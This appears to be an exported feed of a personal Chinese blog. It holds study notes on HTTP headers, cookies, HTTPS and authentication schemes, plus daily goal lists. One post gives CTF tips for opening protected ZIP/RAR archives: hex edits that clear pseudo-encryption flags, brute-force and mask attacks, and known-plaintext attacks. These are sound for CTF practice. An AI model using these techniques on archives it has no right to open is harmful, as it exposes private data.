<p>比如，对于使用首部字段 Accept-Language 的服务器驱动型请求，当 返回的页面内容与实际请求的对象不同时，首部字段 Content-Location 内会写明 URI。（访问 <a href="http://www.hackr.jp/" target="_blank" rel="noopener">http://www.hackr.jp/</a> 返回的对象却是 <a href="http://www.hackr.jp/index-ja.html" target="_blank" rel="noopener">http://www.hackr.jp/index-ja.html</a> 等类似情况） </p>
<h4 id="Content-MD5"><a href="#Content-MD5" class="headerlink" title="Content-MD5"></a>Content-MD5</h4><p>首部字段 Content-MD5 是一串由 MD5 算法生成的值，其目的在于检 查报文主体在传输过程中是否保持完整，以及确认传输到达。</p>
<p>对报文主体执行 MD5 算法获得的 128 位二进制数，再通过 Base64 编 码后将结果写入 Content-MD5 字段值。由于 HTTP 首部无法记录二进 制值，所以要通过 Base64 编码处理。为确保报文的有效性，作为接 收方的客户端会对报文主体再执行一次相同的 MD5 算法。计算出的值与字段值作比较后，即可判断出报文主体的准确性。</p>
<p>采用这种方法，对内容上的偶发性改变是无从查证的，也无法检测出 恶意篡改。其中一个原因在于，内容如果能够被篡改，那么同时意味 着 Content-MD5 也可重新计算然后被篡改。所以处在接收阶段的客户 端是无法意识到报文主体以及首部字段 Content-MD5 是已经被篡改过 的。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/98.png" alt="98"></p>
<h4 id="Content-Range"><a href="#Content-Range" class="headerlink" title="Content-Range"></a>Content-Range</h4><p>针对范围请求，返回响应时使用的首部字段 Content-Range，能告知客 户端作为响应返回的实体的哪个部分符合范围请求。字段值以字节为 单位，表示当前发送部分及整个实体大小。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/99.png" alt="99"></p>
<h4 id="Content-Type"><a href="#Content-Type" class="headerlink" title="Content-Type"></a>Content-Type</h4><p>首部字段 Content-Type 说明了实体主体内对象的媒体类型。和首部字 段 Accept 一样，字段值用 type/subtype 形式赋值。</p>
<blockquote>
<p>Content-Type: text/html; charset=UTF-8</p>
</blockquote>
<h4 id="Expires"><a href="#Expires" class="headerlink" title="Expires"></a>Expires</h4><p>首部字段 Expires 会将资源失效的日期告知客户端。缓存服务器在接 收到含有首部字段 Expires 的响应后，会以缓存来应答请求，在 Expires 字段值指定的时间<strong>之前</strong>，响应的副本会一直被保存。当超过指定的时间<strong>后</strong>，缓存服务器在请求发送过来时，会转向源服务器请求 资源。</p>
<p>源服务器不希望缓存服务器对资源缓存时，最好在 Expires 字段内写 入与首部字段 Date 相同的时间值。 </p>
<p>但是，当首部字段 Cache-Control 有指定 max-age 指令时，比起首部字 段 Expires，会<strong>优先处理 max-age</strong> 指令。 </p>
<h4 id="Last-Modified"><a href="#Last-Modified" class="headerlink" title="Last-Modified"></a>Last-Modified</h4><p>首部字段 Last-Modified 指明资源最终修改的时间。一般来说，这个 值就是 Request-URI 指定资源被修改的时间。但类似使用 CGI 脚本进 行动态数据处理时，该值有可能会变成数据最终修改时的时间</p>
<h3 id="为-Cookie-服务的首部字段"><a href="#为-Cookie-服务的首部字段" class="headerlink" title="为 Cookie 服务的首部字段"></a>为 Cookie 服务的首部字段</h3><p>Cookie 的工作机制是用户识别及状态管理。Web 网站为了管理用户的 状态会通过 Web 浏览器，把一些数据临时写入用户的计算机内。接 着当用户访问该Web网站时，可通过通信方式取回之前发放的 Cookie。 </p>
<p>调用 Cookie 时，由于可校验 Cookie 的有效期，以及发送方的域、路 径、协议等信息，所以正规发布的 Cookie 内的数据不会因来自其他 Web 站点和攻击者的攻击而泄露。 </p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/100.png" alt="100"></p>
<h4 id="Set-Cookie"><a href="#Set-Cookie" class="headerlink" title="Set-Cookie"></a>Set-Cookie</h4><p>当服务器准备开始管理客户端的状态时，会事先告知各种信息。</p>
<blockquote>
<p>Set-Cookie: status=enable; expires=Tue, 05 Jul 2011 07:26:31</p>
</blockquote>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/101.png" alt="101"></p>
<h5 id="domain-属性"><a href="#domain-属性" class="headerlink" title="domain 属性"></a>domain 属性</h5><p>通过 Cookie 的 domain 属性指定的域名可做到与结尾匹配一致。比 如，当指定 example.com 后，除 example.com 以外，<a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a> 或 www2.example.com 等都可以发送 Cookie。 </p>
<p>因此，除了针对具体指定的多个域名发送 Cookie 之 外，不指定 domain 属性显得更安全。 </p>
<h5 id="secure-属性"><a href="#secure-属性" class="headerlink" title="secure 属性"></a>secure 属性</h5><p>发送 Cookie 时，指定 secure 属性的方法如下所示。</p>
<blockquote>
<p>Set-Cookie: name=value; secure</p>
</blockquote>
<h5 id="HttpOnly-属性"><a href="#HttpOnly-属性" class="headerlink" title="HttpOnly 属性"></a>HttpOnly 属性</h5><p>发送指定 HttpOnly 属性的 Cookie 的方法如下所示。</p>
<blockquote>
<p>Set-Cookie: name=value; HttpOnly</p>
</blockquote>
<p>通过上述设置，通常从 Web 页面内还可以对 Cookie 进行读取操作。 但使用 JavaScript 的 document.cookie 就无法读取附加 HttpOnly 属性后 的 Cookie 的内容了。因此，也就无法在 XSS 中利用 JavaScript 劫持 Cookie 了。 </p>
<h5 id="expires-属性"><a href="#expires-属性" class="headerlink" title="expires 属性"></a>expires 属性</h5><p>一旦 Cookie 从服务器端发送至客户端，服务器端就不存在可 以显式删除 Cookie 的方法。但可通过覆盖已过期的 Cookie，实现对 客户端 Cookie 的实质性删除操作。 </p>
<h5 id="path-属性"><a href="#path-属性" class="headerlink" title="path 属性"></a>path 属性</h5><p>Cookie 的 path 属性可用于限制指定 Cookie 的发送范围的文件目录。 不过另有办法可避开这项限制，看来对其作为安全机制的效果不能抱 有期待。</p>
<h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><p>首部字段 Cookie 会告知服务器，当客户端想获得 HTTP 状态管理支 持时，就会在请求中包含从服务器接收到的 Cookie。接收到多个 Cookie 时，同样可以以多个 Cookie 形式发送。 </p>
<blockquote>
<p>Cookie: status=enable</p>
</blockquote>
<h3 id="其他首部字段"><a href="#其他首部字段" class="headerlink" title="其他首部字段"></a>其他首部字段</h3><p>HTTP 首部字段是可以自行扩展的。所以在 Web 服务器和浏览器的应 用上，会出现各种非标准的首部字段。</p>
<h4 id="X-Frame-Options"><a href="#X-Frame-Options" class="headerlink" title="X-Frame-Options"></a>X-Frame-Options</h4><p>首部字段 X-Frame-Options 属于 HTTP 响应首部，用于控制网站内容 在其他 Web 网站的 Frame 标签内的显示问题。其主要目的是为了防 止点击劫持（clickjacking）攻击。</p>
<p>首部字段 X-Frame-Options 有以下两个可指定的字段值。 </p>
<ol>
<li>DENY ：拒绝 </li>
<li>SAMEORIGIN ：仅同源域名下的页面（Top-level-browsingcontext）匹配时许可。（比如，当指定 <a href="http://hackr.jp/sample.html" target="_blank" rel="noopener">http://hackr.jp/sample.html</a> 页面为 SAMEORIGIN 时，那么 hackr.jp 上所有页面的 frame 都被 允许可加载该页面，而 example.com 等其他域名的页面就不行 了）</li>
</ol>
<p>对 apache2.conf 的配置实例</p>
<blockquote>
<IfModule mod_headers.c>

<p>Header append X-FRAME-OPTIONS “SAMEORIGIN” </p>
</IfModule>
</blockquote>
<h4 id="X-XSS-Protection"><a href="#X-XSS-Protection" class="headerlink" title="X-XSS-Protection"></a>X-XSS-Protection</h4><p>首部字段 X-XSS-Protection 属于 HTTP 响应首部，它是针对跨站脚本 攻击（XSS）的一种对策，用于控制浏览器 XSS 防护机制的开关。 </p>
<p>首部字段 X-XSS-Protection 可指定的字段值如下。 </p>
<ol>
<li>0 ：将 XSS 过滤设置成无效状态 </li>
<li>1 ：将 XSS 过滤设置成有效状态 </li>
</ol>
<h4 id="DNT"><a href="#DNT" class="headerlink" title="DNT"></a>DNT</h4><p>首部字段 DNT 属于 HTTP 请求首部，其中 DNT 是 Do Not Track 的简 称，意为拒绝个人信息被收集，是表示拒绝被精准广告追踪的一种方法。</p>
<p>首部字段 DNT 可指定的字段值如下。</p>
<ol>
<li>0 ：同意被追踪 </li>
<li>1 ：拒绝被追踪 </li>
</ol>
<h4 id="P3P"><a href="#P3P" class="headerlink" title="P3P"></a>P3P</h4><p>首部字段 P3P 属于 HTTP 相应首部，通过利用 P3P（The Platform for Privacy Preferences，在线隐私偏好平台）技术，可以让 Web 网站上 的个人隐私变成一种仅供程序可理解的形式，以达到保护用户隐私的 目的。、</p>
<blockquote>
<p>P3P: CP=”CAO DSP LAW CURa ADMa DEVa TAIa PSAa PSDa IVAa IVDa</p>
</blockquote>
<p>要进行 P3P 的设定，需按以下操作步骤进行。 </p>
<ol>
<li>步骤 1：创建 P3P 隐私 </li>
<li>步骤 2：创建 P3P 隐私对照文件后，保存命名在 /w3c/p3p.xml </li>
<li>步骤 3：从 P3P 隐私中新建 Compact policies 后，输出到 HTTP 响应中</li>
</ol>
<blockquote>
<p>P3P详情：<a href="https://www.w3.org/TR/P3P/" target="_blank" rel="noopener">https://www.w3.org/TR/P3P/</a></p>
</blockquote>
<h2 id="HTTP-加密-认证-完整性保护-HTTPS"><a href="#HTTP-加密-认证-完整性保护-HTTPS" class="headerlink" title="HTTP+ 加密 + 认证 + 完整性保护 =HTTPS"></a>HTTP+ 加密 + 认证 + 完整性保护 =HTTPS</h2><h3 id="HTTPS-采用混合加密机制"><a href="#HTTPS-采用混合加密机制" class="headerlink" title="HTTPS 采用混合加密机制"></a>HTTPS 采用混合加密机制</h3><h4 id="共享密钥加密的困境"><a href="#共享密钥加密的困境" class="headerlink" title="共享密钥加密的困境"></a>共享密钥加密的困境</h4><p>加密和解密同用一个密钥的方式称为共享密钥加密（Common key crypto system），也被叫做对称密钥加密。</p>
<p>以共享密钥方式加密时必须将密钥也发给对方。可究竟怎样才能 安全地转交？在互联网上转发密钥时，如果通信被监听那么密钥 就可会落入攻击者之手，同时也就失去了加密的意义。另外还得 设法安全地保管接收到的密钥</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/105.png" alt="105"></p>
<h4 id="公开密钥加密方式解决了共享密钥加密的困难"><a href="#公开密钥加密方式解决了共享密钥加密的困难" class="headerlink" title="公开密钥加密方式解决了共享密钥加密的困难"></a>公开密钥加密方式解决了共享密钥加密的困难</h4><p>公开密钥加密使用一对非对称的密钥。一把叫做私有密钥 （private key），另一把叫做公开密钥（public key）。顾名思 义，私有密钥不能让其他任何人知道，而公开密钥则可以随意发布，任何人都可以获得。</p>
<p>使用公开密钥加密方式，发送密文的一方使用对方的公开密钥进 行加密处理，对方收到被加密的信息后，再使用自己的私有密钥 进行解密。利用这种方式，不需要发送用来解密的私有密钥，也 不必担心密钥被攻击者窃听而盗走。</p>
<p>另外，要想根据密文和公开密钥，恢复到信息原文是异常困难 的，因为解密过程就是在对离散对数进行求值，这并非轻而易举 就能办到。退一步讲，如果能对一个非常大的整数做到快速地因 式分解，那么密码破解还是存在希望的。但就目前的技术来看是 不太现实的。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/106.png" alt="106"></p>
<h4 id="HTTPS-采用混合加密机制-1"><a href="#HTTPS-采用混合加密机制-1" class="headerlink" title="HTTPS 采用混合加密机制"></a>HTTPS 采用混合加密机制</h4><p>HTTPS 采用共享密钥加密和公开密钥加密两者并用的混合加密机制。若密钥能够实现安全交换，那么有可能会考虑仅使用公开密钥加密来通信。但是公开密钥加密与共享密钥加密相比，其处 理速度要慢。</p>
<p>所以应充分利用两者各自的优势，将多种方法组合起来用于通 信。在交换密钥环节使用公开密钥加密方式，之后的建立通信交换报文阶段则使用共享密钥加密方式。</p>
<h2 id="确认访问用户身份的认证"><a href="#确认访问用户身份的认证" class="headerlink" title="确认访问用户身份的认证"></a>确认访问用户身份的认证</h2><h3 id="BASIC-认证"><a href="#BASIC-认证" class="headerlink" title="BASIC 认证"></a>BASIC 认证</h3><ol>
<li>步骤 1： 当请求的资源需要 BASIC 认证时，服务器会随状态码 401 Authorization Required，返回带 WWW-Authenticate 首部字段的响应。 该字段内包含认证的方式（BASIC） 及 Request-URI 安全域字符串 （realm）。 </li>
<li>步骤 2： 接收到状态码 401 的客户端为了通过 BASIC 认证，需要将 用户 ID 及密码发送给服务器。发送的字符串内容是由用户 ID 和密码 构成，两者中间以冒号（:）连接后，再经过 Base64 编码处理。 假设用户 ID 为 guest，密码是 guest，连接起来就会形成 guest:guest 这 样的字符串。然后经过 Base64 编码，最后的结果即是 Z3Vlc3Q6Z3Vlc3Q=。把这串字符串写入首部字段 Authorization 后， 发送请求。<br>当用户代理为浏览器时，用户仅需输入用户 ID 和密码即可，之后， 浏览器会自动完成到 Base64 编码的转换工作。</li>
<li>步骤 3： 接收到包含首部字段 Authorization 请求的服务器，会对认证 信息的正确性进行验证。如验证通过，则返回一条包含 Request-URI 资源的响应。</li>
</ol>
<p><strong>缺点：</strong></p>
<p>BASIC 认证虽然采用 Base64 编码方式，但这不是加密处理。不需要 任何附加信息即可对其解码。换言之，由于明文解码后就是用户 ID 和密码，在 HTTP 等非加密通信的线路上进行 BASIC 认证的过程 中，如果被人窃听，被盗的可能性极高。</p>
<p>另外，除此之外想再进行一次 BASIC 认证时，一般的浏览器却<strong>无法实现认证注销操作</strong>，这也是问题之一。</p>
<p>BASIC 认证使用上不够便捷灵活，且达不到多数 Web 网站期望的安 全性等级，因此它并不常用。 </p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/102.png" alt="102"></p>
<h3 id="DIGEST-认证"><a href="#DIGEST-认证" class="headerlink" title="DIGEST 认证"></a>DIGEST 认证</h3><ol>
<li>步骤 1： 请求需认证的资源时，服务器会随着状态码 401 Authorization Required，返 回带 WWW-Authenticate 首部字段的响应。 该字段内包含质问响应方式认证所需的临时质询码（随机数， nonce）。<br>首部字段 WWW-Authenticate 内必须包含 realm 和 nonce 这两个字段的 信息。客户端就是依靠向服务器回送这两个值进行认证的。<br>nonce 是一种每次随返回的 401 响应生成的任意随机字符串。该字符 串通常推荐由 Base64 编码的十六进制数的组成形式，但实际内容依 赖服务器的具体实现。</li>
<li>步骤 2： 接收到 401 状态码的客户端，返回的响应中包含 DIGEST 认 证必须的首部字段 Authorization 信息。 首部字段 Authorization 内必须包含 username、realm、nonce、uri 和 response 的字段信息。其中，realm 和 nonce 就是之前从服务器接收到 的响应中的字段。<br>username 是 realm 限定范围内可进行认证的用户名。 uri（digest-uri）即 Request-URI 的值，但考虑到经代理转发后 Request-URI 的值可能被修改，因此事先会复制一份副本保存在 uri 内。<br>response 也可叫做 Request-Digest，存放经过 MD5 运算后的密码字符 串，形成响应码。<br>响应中其他的实体请参见第 6 章的请求首部字段 Authorization。另 外，有关 Request-Digest 的计算规则较复杂，有兴趣的读者不妨深入 学习一下 RFC2617。 </li>
<li>步骤 3： 接收到包含首部字段 Authorization 请求的服务器，会确认认 证信息的正确性。认证通过后则返回包含 Request-URI 资源的响应。 并且这时会在首部字段 Authentication-Info 写入一些认证成功的相关信息。</li>
</ol>
<p><strong>缺点：</strong></p>
<p>DIGEST 认证提供了高于 BASIC 认证的安全等级，但是和 HTTPS 的 客户端认证相比仍旧很弱。DIGEST 认证提供防止密码被窃听的保护机制，但并不存在防止用户伪装的保护机制。</p>
<p>DIGEST 认证和 BASIC 认证一样，使用上不那么便捷灵活，且仍达不 到多数 Web 网站对高度安全等级的追求标准。因此它的适用范围也 有所受限</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/103.png" alt="103"></p>
<h3 id="SSl客户端认证"><a href="#SSl客户端认证" class="headerlink" title="SSl客户端认证"></a>SSl客户端认证</h3><p>如果用户的ID和密码被盗，则很可能被冒充。</p>
<p>SSL 客户端认证是借由 HTTPS 的客户端证书完成认证的方式。凭借客户端证书（在 HTTPS 一章已讲解）认证，服务器可确认访问<strong>是否来自已登录的客户端</strong>。</p>
<p>为达到 SSL 客户端认证的目的，需要事先将客户端证书分发给客户 端，且客户端必须安装此证书。</p>
<ol>
<li>步骤 1： 接收到需要认证资源的请求，服务器会发送 Certificate Request 报文，要求客户端提供客户端证书。 </li>
<li>步骤 2： 用户选择将发送的客户端证书后，客户端会把客户端证书信 息以 Client Certificate 报文方式发送给服务器。<br>图：选择客户端证书示例（三菱东京 UFJ 银行） </li>
<li>步骤 3： 服务器验证客户端证书验证通过后方可领取证书内客户端的公开密钥，然后开始 HTTPS 加密通信。</li>
</ol>
<blockquote>
<p>在多数情况下，SSL 客户端认证不会仅依靠证书完成认证，一般会和 基于表单认证（稍后讲解）组合形成一种双因素认证（Two-factor authentication）来使用。所谓双因素认证就是指，认证过程中不仅需 要密码这一个因素，还需要申请认证者提供其他持有信息，从而作为 另一个因素，与其组合使用的认证方式。</p>
<p>换言之，第一个认证因素的 SSL 客户端证书用来认证客户端计算机， 另一个认证因素的密码则用来确定这是用户本人的行为。</p>
<p>通过双因素认证后，就可以确认是<strong>用户本人</strong>正在使用<strong>匹配正确的计算机</strong>访问服务器。</p>
</blockquote>
<p>注：SSL客户端认证需要支付费用</p>
<h3 id="基于表单认证"><a href="#基于表单认证" class="headerlink" title="基于表单认证"></a>基于表单认证</h3><p>基于表单的认证方法并不是在 HTTP 协议中定义的。客户端会向<strong>服务器上的 Web 应用程序</strong>发送登录信息（Credential），按登录信息的验 证结果认证。</p>
<p>基于表单认证的标准规范尚未有定论，一般会使用 Cookie 来管理 Session（会话）。 </p>
<ol>
<li>步骤 1： 客户端把用户 ID 和密码等登录信息放入报文的实体部分， 通常是以 POST 方法把请求发送给服务器。而这时，会使用 HTTPS 通信来进行 HTML 表单画面的显示和用户输入数据的发送。 </li>
<li>步骤 2： 服务器会发放用以识别用户的 Session ID。通过验证从客户端发送过来的登录信息进行身份认证，然后把用户的认证状态与 Session ID 绑定后记录在服务器端。 向客户端返回响应时，会在首部字段 Set-Cookie 内写入 Session ID（如 PHPSESSID=028a8c…）。 你可以把 Session ID 想象成一种用以区分不同用户的等位号。<br>然而，如果 Session ID 被第三方盗走，对方就可以伪装成你的身份进 行恶意操作了。因此必须防止 Session ID 被盗，或被猜出。为了做到 这点，Session ID 应使用难以推测的字符串，且服务器端也需要进行 有效期的管理，保证其安全性。<br>另外，为减轻跨站脚本攻击（XSS）造成的损失，建议事先在 Cookie 内加上 <strong>httponly</strong> 属性。</li>
<li>步骤 3： 客户端接收到从服务器端发来的 Session ID 后，会将其作为 Cookie 保存在本地。下次向服务器发送请求时，浏览器会自动发送 Cookie，所以 Session ID 也随之发送到服务器。服务器端可通过验证 接收到的 Session ID 识别用户和其认证状态。</li>
</ol>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/104.png" alt="104"></p>
<p>另外，不仅基于表单认证的登录信息及认证过程都无标准化的方法， 服务器端应如何保存用户提交的密码等登录信息等也没有标准化。 </p>
<p>通常，一种安全的保存方法是，先利用给密码加盐（salt）1 的方式增 加额外信息，再使用散列（hash）函数计算出散列值后保存。但是我 们也经常看到直接保存明文密码的做法，而这样的做法具有导致密码 泄露的风险。</p>
<blockquote>
<p>1 salt 其实就是由服务器随机生成的一个字符串，但是要保证长度足够长，并且是 真正随机生成的。然后把它和密码字符串相连接（前后都可以）生成散列值。当 两个用户使用了同一个密码时，由于随机生成的 salt 值不同，对应的散列值也将 是不同的。这样一来，很大程度上减少了密码特征，攻击者也就很难利用自己手 中的密码特征库进行破解。</p>
</blockquote>
<h2 id="基于HTTP协议追加的协议"><a href="#基于HTTP协议追加的协议" class="headerlink" title="基于HTTP协议追加的协议"></a>基于HTTP协议追加的协议</h2><h3 id="消除-HTTP-瓶颈的-SPDY"><a href="#消除-HTTP-瓶颈的-SPDY" class="headerlink" title="消除 HTTP 瓶颈的 SPDY"></a>消除 HTTP 瓶颈的 SPDY</h3><h4 id="原本的HTTP协议"><a href="#原本的HTTP协议" class="headerlink" title="原本的HTTP协议"></a>原本的HTTP协议</h4><p>若想在现有 Web 实现所需的功能，以下这些 HTTP 标准就会成为瓶 颈。</p>
<ol>
<li>一条连接上只可发送一个请求。</li>
<li>请求只能从客户端开始。客户端不可以接收除响应以外的指 令。</li>
<li>请求 / 响应首部未经压缩就发送。首部信息越多延迟越大。</li>
<li>发送冗长的首部。每次互相发送相同的首部造成的浪费较 多。</li>
<li>可任意选择数据压缩格式。非强制压缩发送。</li>
</ol>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/107.png" alt="107"></p>
<h4 id="Ajax-的解决方法"><a href="#Ajax-的解决方法" class="headerlink" title="Ajax 的解决方法"></a>Ajax 的解决方法</h4><p>Ajax 的核心技术是名为 XMLHttpRequest 的 API，通过 JavaScript 脚本语言的调用就能和服务器进行 HTTP 通信。借由这种手段，就能从已 加载完毕的 Web 页面上发起请求，<strong>只更新局部页面</strong>。 </p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/108.png" alt="108"></p>
<h4 id="Comet-的解决方法"><a href="#Comet-的解决方法" class="headerlink" title="Comet 的解决方法"></a>Comet 的解决方法</h4><p>通常，服务器端接收到请求，在处理完毕后就会立即返回响应，但为 了实现推送功能，Comet 会先将响应置于挂起状态，当服务器端有内 容更新时，再返回该响应。因此，服务器端一旦有更新，就可以立即 反馈给客户端。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/109.png" alt="109"></p>
<h4 id="SPDY-的设计与功能"><a href="#SPDY-的设计与功能" class="headerlink" title="SPDY 的设计与功能"></a>SPDY 的设计与功能</h4><p>SPDY 以<strong>会话层</strong>的形式加入，控制对数据的流动，但还是采用 HTTP 建立通信连接。因此，可照常使用 HTTP 的 GET 和 POST 等方 法、Cookie 以及 HTTP 报文等。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/110.png" alt="110"></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/111.png" alt="111"></p>
<p>使用 SPDY 后，HTTP 协议额外获得以下功能。</p>
<ol>
<li><p>多路复用流<br>通过单一的 TCP 连接，可以无限制处理多个 HTTP 请求。所有请求的处理都在一条 TCP 连接上完成，因此 TCP 的处理效率得到提高。</p>
</li>
<li><p>赋予请求优先级<br>SPDY 不仅可以无限制地并发处理请求，还可以给请求逐个分配优先级顺序。这样主要是为了在发送多个请求时，解决因带宽低而导致响应变慢的问题。</p>
</li>
<li><p>压缩 HTTP 首部                                                                        </p>
<p>压缩 HTTP 请求和响应的首部。这样一来，通信产生的数据包数量和 发送的字节数就更少了。</p>
</li>
<li><p>推送功能<br>支持服务器主动向客户端推送数据的功能。这样，服务器可直接发送 数据，而不必等待客户端的请求。</p>
</li>
<li><p>服务器提示功能<br>服务器可以主动提示客户端请求所需的资源。由于在客户端发现资源之前就可以获知资源的存在，因此在资源已缓存等情况下，可以避免发送不必要的请求。</p>
</li>
</ol>
<h3 id="WebSocket-协议"><a href="#WebSocket-协议" class="headerlink" title="WebSocket 协议"></a>WebSocket 协议</h3><p>下面我们列举一下 WebSocket 协议的主要特点。</p>
<p>推送功能<br>支持由服务器向客户端推送数据的推送功能。这样，服务器可直接发送数据，而不必等待客户端的请求。</p>
<p>减少通信量<br>只要建立起 WebSocket 连接，就希望一直保持连接状态。和 HTTP相 比，不但每次连接时的总开销减少，而且由于 WebSocket 的首部信息 很小，通信量也相应减少了。<br>为了实现 WebSocket 通信，在 HTTP 连接建立之后，需要完成一 次“握手”（Handshaking）的步骤。 </p>
<blockquote>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/114.png" alt="114"></p>
<p>握手步骤：</p>
<ol>
<li>（握手请求）为了实现 WebSocket 通信，需要用到 HTTP 的 Upgrade 首部字 段，告知服务器通信协议发生改变，以达到握手的目的。<br>Sec-WebSocket-Key 字段内记录着握手过程中必不可少的键值。 Sec-WebSocket-Protocol 字段内记录使用的子协议。 子协议按 WebSocket 协议标准在连接分开使用时，定义那些连接的名称。<img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/112.png" alt="112"></li>
<li>（握手响应）对于之前的请求，返回状态码 101 Switching Protocols 的响应。Sec-WebSocket-Accept 的字段值是由握手请求中的 SecWebSocket-Key 的字段值生成的。 成功握手确立 WebSocket 连接之后，通信时不再使用 HTTP 的数据帧，而采用 WebSocket 独立的数据帧。<img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/113.png" alt="113"></li>
<li>（WebSocket API ）JavaScript 可调用“The WebSocket API”（<a href="http://www.w3.org/TR/websockets/，由" target="_blank" rel="noopener">http://www.w3.org/TR/websockets/，由</a> W3C 标准制定）内 提供的 WebSocket 程序接口，以实现 WebSocket 协议下全双工通信。<br>以下为调用 WebSocket API，每 50ms 发送一次数据的实例。<img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/115.png" alt="115"></li>
</ol>
</blockquote>
<h3 id="Web-服务器管理文件的-WebDAV"><a href="#Web-服务器管理文件的-WebDAV" class="headerlink" title="Web 服务器管理文件的 WebDAV"></a>Web 服务器管理文件的 WebDAV</h3><p>等用到了再回来补充</p>
]]></content>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title>文件压缩</title>
    <url>/2020/01/17/%E6%96%87%E4%BB%B6%E5%8E%8B%E7%BC%A9/</url>
    <content><![CDATA[<h2 id="伪加密"><a href="#伪加密" class="headerlink" title="伪加密"></a>伪加密</h2><h3 id="zip文件"><a href="#zip文件" class="headerlink" title="zip文件"></a>zip文件</h3><p>用winhex打开压缩文件，搜索十六进制”50 4B 01 02”，找到从”50”开始的第九第十个字节全部改成”00 00”。</p>
<p><em>（十六进制编译器里每两个数字称为一个字节）</em></p>
<h3 id="rar文件"><a href="#rar文件" class="headerlink" title="rar文件"></a>rar文件</h3><p>用winhex打开十六进制，找到第24个字节，其尾数为0为未加密，为4则为加密。例如将’’84”改为’’80”.</p>
<h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><h3 id="rar文件-1"><a href="#rar文件-1" class="headerlink" title="rar文件"></a>rar文件</h3><p>用ARCHPR暴力破解</p>
<p><strong>小技巧：若知道前三位为abc，则可选择攻击类型为掩码，掩码选择填”abc???”</strong></p>
<h3 id="zip文件-1"><a href="#zip文件-1" class="headerlink" title="zip文件"></a>zip文件</h3><p>用Ziperello暴力破解</p>
<h2 id="明文攻击"><a href="#明文攻击" class="headerlink" title="明文攻击"></a>明文攻击</h2><p>明文攻击是指知道加密的zip中部分文件的明文内容，利用这些内容推测出密钥并解密zip文件的攻击方法，相比于暴力破解，这种方法在破解复杂压缩包时效率较高。</p>
<p>例：假设一个加密的压缩包里有两个文件readme.txt和flag.txt，其中flag.txt的内容是答案，而我们拥有readme.txt的明文文件，使用上述两个文件可进行明文攻击。</p>
<p>步骤：</p>
<ol>
<li>将readme.txt的明文文件压缩，变成readme1.zip</li>
<li>打开archpr，攻击类型选明文，明文文件路径选readme1.zip</li>
</ol>
<p><em>注：</em></p>
<ol>
<li>有时跑完得不到指令，但能获得一个提示（加密密钥）。</li>
<li>例如将“1.rar”解压为“1.txt”和“1.png”，要将明文文件“1.txt”压缩，压缩的CRC值和压缩算法要与1.rar一致。</li>
</ol>
<h2 id="压缩包修复"><a href="#压缩包修复" class="headerlink" title="压缩包修复"></a>压缩包修复</h2><p>一个压缩包内可能含有多个文件，而文件头损坏会导致解压不出所以文件，所以</p>
<ol>
<li>找到一个文件的尾部（例如txt的尾部是txt的文本内容）</li>
<li>将下一个文件头第三个字节改为“0x74“</li>
</ol>
<p><img src="/2020/01/17/%E6%96%87%E4%BB%B6%E5%8E%8B%E7%BC%A9/1.png" alt="1"></p>
]]></content>
      <categories>
        <category>ctf技巧</category>
      </categories>
  </entry>
  <entry>
    <title>2020-01-14日目标</title>
    <url>/2020/01/14/2020-01-14%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-01-14目标"><a href="#2020-01-14目标" class="headerlink" title="2020-01-14目标"></a>2020-01-14目标</h2><ol>
<li>听力10min+单词10个</li>
<li>早上9：00前起床</li>
<li>高数微分方程</li>
<li>晚上1：00前睡觉</li>
<li>ctf压缩文件</li>
</ol>
<h2 id="2020-01-13总结"><a href="#2020-01-13总结" class="headerlink" title="2020-01-13总结"></a>2020-01-13总结</h2><ol>
<li>晚上复习了高数定积分和不定积分</li>
<li>整理好了图片隐写</li>
<li>安装好了kali虚拟机</li>
</ol>
<table>
<thead>
<tr>
<th>目标</th>
<th>(Y/N)</th>
</tr>
</thead>
<tbody><tr>
<td>听力10min+单词10个</td>
<td>Y</td>
</tr>
<tr>
<td>早上9：00前起床</td>
<td>N</td>
</tr>
<tr>
<td>高数定积分&amp;&amp;不定积分</td>
<td>Y</td>
</tr>
<tr>
<td>整理图片隐写</td>
<td>Y</td>
</tr>
<tr>
<td>安装好kali虚拟机</td>
<td>Y</td>
</tr>
<tr>
<td>晚上1：00前睡觉</td>
<td>Y</td>
</tr>
<tr>
<td>状态</td>
<td>T</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>2020-01-13日目标</title>
    <url>/2020/01/13/2020-01-13%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-01-13目标"><a href="#2020-01-13目标" class="headerlink" title="2020-01-13目标"></a>2020-01-13目标</h2><ol>
<li>听力10min+单词10个</li>
<li>早上9：00前起床</li>
<li>高数定积分&amp;&amp;不定积分</li>
<li>整理图片隐写</li>
<li>安装好kali虚拟机</li>
<li>晚上1：00前睡觉</li>
</ol>
